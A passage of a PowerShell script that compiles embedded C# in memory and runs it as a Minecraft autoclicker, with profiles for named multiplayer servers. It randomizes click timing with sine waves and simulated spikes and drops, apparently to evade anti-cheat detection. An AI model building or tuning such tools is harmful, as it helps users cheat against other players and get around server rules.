                                if (cpsSpike > 1)
                                    minDelay -= GetRandomDouble(1, 25);
                                double maxDelay = 1000 / MaximumCPS;
                                if (cpsDrop > 0)
                                    maxDelay += GetRandomDouble(1, 22);
                                double average = (maxDelay + minDelay) / 2;
                                double halfDifference = (minDelay - maxDelay) / 2;
                                double delay = Math.Sin(sinX) * halfDifference + average;
                                sinX += GetRandomDouble(GetRandomDouble(0.03, 0.1), GetRandomDouble(0.69, 1.24));
                                
                                // 0x0084 = WM_NCHITTEST
                                if (SendMessage(ForegroundWindow, 0x0084, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y)) == (IntPtr) 1)
                                {
                                    lastDelay = (((int)delay) >> 1) - dif;
                                    if (lastDelay < 0 || lastDelay == Int32.MaxValue) lastDelay = 0;
                                    SendMessage(ForegroundWindow, 0x0201, (UIntPtr) 0x0001, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                    SendMessage(ForegroundWindow, 0x0202, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                }
                                lastEvent++;
                            }
                        }
                    }
                }
                
                if (!Binds()) running = false;
            }
            return;
        }

        public static void Minemen(string[] args) {
            bool running = true;
            
            StatusRow = Console.CursorTop;
            
            int MinimumCPS = Int32.Parse(args[4]);
            int MaximumCPS = Int32.Parse(args[5]);
            if (MinOverMaxCheck(MinimumCPS, MaximumCPS)) return;
            
            long lastLoopRun = 0;
            long now = 0;
            long dif = 0;
            long lastDelay = 0;
            
            long cpsSpike = 0;
            long cpsDrop = 0;
            long lastEvent = -15;
            double sinX = 0;
            
            DrawStatus(StatusRow, ClickerEnabled);
            
            while (running)
            {
                ForegroundWindow = GetForegroundWindow();
                MCWindow = FindWindow("LWJGL", null);
                
                // Clicker code
                if (ClickerEnabled)
                {
                    if (BitConverter.GetBytes(GetAsyncKeyState(1))[1] == 0x80)
                    {
                        if (MCWindow == ForegroundWindow)
                        {
                            if (lastLoopRun == 0) {
                                lastLoopRun = GetSystemTime();
                            } else {
                                now = GetSystemTime();
                                dif = (now - lastLoopRun) >> 1;
                                dif -= lastDelay;
                                lastLoopRun = now;
                                
                                if (cpsDrop > 0) cpsDrop--;
                                if (cpsSpike > 0) cpsSpike--;
                                
                                if (lastEvent > 0) {
                                    if (rand.Next(0, 100 / (int) lastEvent) == 0) {
                                        cpsSpike = 25;
                                        lastEvent = -20;
                                    } else if (rand.Next(0, 100 / (int) lastEvent) == 0) {
                                        cpsDrop = 50;
                                        lastEvent = -30;
                                    }
                                }
                                
                                double minDelay = 1000 / MinimumCPS;
                                if (cpsSpike > 0)
                                    minDelay -= GetRandomDouble(1, 15);
                                double maxDelay = 1000 / MaximumCPS;
                                if (cpsDrop > 0)
                                    maxDelay += GetRandomDouble(1, 15);
                                double average = (maxDelay + minDelay) / 2;
                                double halfDifference = (minDelay - maxDelay) / 2;
                                double delay = Math.Sin(sinX) * halfDifference + average;
                                sinX += GetRandomDouble(GetRandomDouble(0.03, 0.1), GetRandomDouble(0.69, 1.24));
                                
                                // 0x0084 = WM_NCHITTEST
                                if (SendMessage(ForegroundWindow, 0x0084, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y)) == (IntPtr) 1)
                                {
                                    lastDelay = (((int)delay) >> 1) - dif;
                                    if (lastDelay < 0 || lastDelay == Int32.MaxValue) lastDelay = 0;
                                    SendMessage(ForegroundWindow, 0x0201, (UIntPtr) 0x0001, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                    SendMessage(ForegroundWindow, 0x0202, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                }
                                lastEvent++;
                            }
                        }
                    }
                }
                
                if (!Binds()) running = false;
            }
            return;
        }

        public static void CPSCAP(string[] args)
        {
            bool running = true;
            
            StatusRow = Console.CursorTop;
            
            int MinimumCPS = Int32.Parse(args[4]);
            int MaximumCPS = Int32.Parse(args[5]);
            if (MinOverMaxCheck(MinimumCPS, MaximumCPS)) return;
            DrawStatus(StatusRow, ClickerEnabled);
            
            bool ButtonUpOrDown = false; // false = down, true = up
            long ClickWaitTill = 0;
            long RightNow = GetSystemTime();
            
            while (running)
            {
                ForegroundWindow = GetForegroundWindow();
                MCWindow = FindWindow("LWJGL", null);
                
                // Clicker code
                if (ClickerEnabled)
                {
                    if (BitConverter.GetBytes(GetAsyncKeyState(1))[1] == 0x80)
                    {
                        if (MCWindow == ForegroundWindow)
                        {
                            // 0x0084 = WM_NCHITTEST
                            if (SendMessage(ForegroundWindow, 0x0084, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y)) == (IntPtr) 1)
                            {
                                RightNow = GetSystemTime();
                                if (RightNow >= ClickWaitTill)
                                {
                                    if (ButtonUpOrDown) SendMessage(ForegroundWindow, 0x0202, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    else SendMessage(ForegroundWindow, 0x0201, (UIntPtr) 0x0001, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    ButtonUpOrDown = !ButtonUpOrDown;
                                    
                                    int SleepTime = rand.Next((500 / MaximumCPS), (500 / MinimumCPS));
                                    ClickWaitTill = RightNow + SleepTime;
                                }
                            }
                        }
                    }
                    else ButtonUpOrDown = false;
                }
                
                if (!Binds()) running = false;
            }
            return;
        }

        public static void Main()
        {
            rand = new Random();
            ConsoleWindow = GetConsoleWindow();
            string arg="$args";
            string[] args = arg.Split(' ');
            string profile = args[0];
            
            Init(args[1], args[2], args[3]);
            
            if (profile.Contains("Xhays"))
            {
                Xhays(args);
            }
            else if (profile.Contains("Sine"))
            {
                Sine(args);
            }
            else if (profile.Contains("AstralMC"))
            {
                Sine(args);
            }
            else if (profile.Contains("Minemen"))
            {
                Minemen(args);
            }
            else
            {
                Console.WriteLine("There was an error loading your profile, please contact 'exro#4981' on Discord if this problem persists");
            }
        }
    }
}
"@

$assemblies = ("System.Windows.Forms","System.Drawing")
Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp
iex "[n$namespace.c$class]::Main()"
